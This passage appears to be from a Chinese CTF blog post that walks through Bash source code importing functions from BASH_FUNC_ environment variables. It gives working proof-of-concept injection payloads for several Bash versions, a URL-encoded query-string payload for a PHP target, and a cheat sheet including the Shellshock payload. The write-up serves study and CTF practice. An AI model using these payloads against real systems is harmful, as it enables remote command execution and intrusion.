<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (string_index = <span class="number">0</span>; env &amp;&amp; (<span class="built_in">string</span> = env[string_index++]); ) &#123;</span><br><span class="line">    name = <span class="built_in">string</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (privmode == <span class="number">0</span> &amp;&amp; read_but_dont_execute == <span class="number">0</span> &amp;&amp; </span><br><span class="line">        STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN) &amp;&amp;</span><br><span class="line">        STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN) &amp;&amp;</span><br><span class="line">        STREQN (<span class="string">&quot;() &#123;&quot;</span>, <span class="built_in">string</span>, <span class="number">4</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        size_t namelen;</span><br><span class="line">        char *tname;        <span class="comment">/* desired imported function name */</span></span><br><span class="line"></span><br><span class="line">        namelen = char_index - BASHFUNC_PREFLEN - BASHFUNC_SUFFLEN;</span><br><span class="line"></span><br><span class="line">        tname = name + BASHFUNC_PREFLEN;    <span class="comment">/* start of func name */</span></span><br><span class="line">        tname[namelen] = <span class="string">&#x27;\0&#x27;</span>;      <span class="comment">/* now tname == func name */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">string_length</span> = strlen (<span class="built_in">string</span>);</span><br><span class="line">        temp_string = (char *)xmalloc (namelen + <span class="built_in">string_length</span> + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        memcpy (temp_string, tname, namelen);</span><br><span class="line">        temp_string[namelen] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        memcpy (temp_string + namelen + <span class="number">1</span>, <span class="built_in">string</span>, <span class="built_in">string_length</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t import function names that are invalid identifiers from the</span></span><br><span class="line"><span class="comment">         environment in posix mode, though we still allow them to be defined as</span></span><br><span class="line"><span class="comment">         shell variables. */</span></span><br><span class="line">        <span class="keyword">if</span> (absolute_program (tname) == <span class="number">0</span> &amp;&amp; (posixly_correct == <span class="number">0</span> || legal_identifier (tname)))</span><br><span class="line">            parse_and_execute (temp_string, tname, SEVAL_NONINT|SEVAL_NOHIST|SEVAL_FUNCDEF|SEVAL_ONECMD);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            free (temp_string);     <span class="comment">/* parse_and_execute does this */</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里for遍历了所有环境变量，并用<code>=</code>​分割，<code>name</code>​就是环境变量名，<code>string</code>​是值。</p>
<p>当满足下面这些条件的情况下，<code>temp_string</code>​将被传入<code>parse_and_execute</code>​执行：</p>
<ul>
<li>​<code>privmode == 0</code>​，即不能传入<code>-p</code>​参数</li>
<li>​<code>read_but_dont_execute == 0</code>​，即不能传入<code>-n</code>​参数</li>
<li>​<code>STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)</code>​，环境变量名前10个字符等于<code>BASH_FUNC_</code>​</li>
<li>​<code>STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)</code>​，环境变量名后两个字符等于<code>%%</code>​</li>
<li>​<code>STREQN (&quot;() &#123;&quot;, string, 4)</code>​，环境变量的值前4个字符等于<code>() &#123;</code>​</li>
</ul>
<p>前两个条件肯定是满足的，后三个条件是用户可控的，所以这个if语句是肯定可以进入的。进入if语句后，去除前缀<code>BASH_FUNC_</code>​和后缀<code>%%</code>​的部分将是一个变量名，而由<code>() &#123;</code>​开头的字符串将会被执行。</p>
<p>这里其实做的就是一件事：<strong>根据环境变量的值初始化一个匿名函数，并赋予其名字</strong>。</p>
<p>所以，我们传入下面这样一个环境变量，将会在Bash上下文中添加一个myfunc函数：</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">env</span> $&#x27;BASH_FUNC_myfunc%%=() &#123; id; &#125;<span class="string">&#x27; bash -c &#x27;</span>myfunc<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202401031529216.png"></p>
<p>centos8下poc为</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">env</span> $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;<span class="string">&#x27; bash -c &#x27;</span>echo hello<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>所以对于上面的php代码poc为</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?envs[BASH_FUNC_echo<span class="variable">%25</span><span class="variable">%25</span>]<span class="operator">=</span>()<span class="variable">%20</span>&#123;<span class="variable">%20</span>id<span class="comment">;%20&#125;</span></span><br></pre></td></tr></table></figure>

<p>centos7（​<code>Bash 4.2</code>​）poc为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&quot;echo hello&quot;</span></span><br></pre></td></tr></table></figure>

<p>对于p神的总结遇到环境变量注入可以这样子尝试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=() &#123; :; &#125;; <span class="built_in">id</span>;</span><br><span class="line">Bash 4.4以前：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&quot;echo hello&quot;</span></span><br><span class="line">Bash 4.4及以上：<span class="built_in">env</span> $<span class="string">&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span></span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>
<p><a href="https://blog.csdn.net/qq_38154820/article/details/106330120">https://blog.csdn.net/qq_38154820/article/details/106330120</a></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
